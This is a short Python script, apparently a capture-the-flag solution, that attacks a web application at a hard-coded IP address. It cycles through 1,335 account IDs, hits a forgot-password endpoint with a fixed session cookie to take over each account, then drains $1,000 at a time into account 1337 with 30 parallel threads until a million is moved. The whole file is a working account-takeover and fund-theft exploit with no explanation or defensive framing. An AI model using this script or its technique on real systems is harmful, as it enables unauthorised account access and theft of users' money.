import requests
import concurrent.futures
 
HEADERS = { "Cookie": "PHPSESSID=OHSHITHEREWEGOAGAIN" }
TOTAL_TRANSFERED = 0
TRANSFER_TO = 1337

def forgetPass(id):
    try:
        req = requests.get(f"http://3.248.33.115:40081/forgot-password.php?username={id}", headers=HEADERS)
    except BaseException as e:
        print(f"[DEBUG] Forget password request error: {e}")
        pass

def transfer(id):
    global TOTAL_TRANSFERED
    try:
        if TOTAL_TRANSFERED >= 1000000:
            return

        forgetPass(id)
        res = ""
        while "Insufficient funds" not in res and TOTAL_TRANSFERED < 1000000:
            req = requests.get(f"http://3.248.33.115:40081/transfere.php?receiver_account={TRANSFER_TO}&amount=1000", headers=HEADERS)
            res = req.text
            TOTAL_TRANSFERED += 1000
            print(f"[Success] Send 1000$ From {id}")

    except BaseException as e:
        print(f"[DEBUG] Transfer request error: {e}")
        pass

def main():
    accounts = []
    for i in range(1,1336):
        accounts.append(i)

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(transfer, accounts)

main()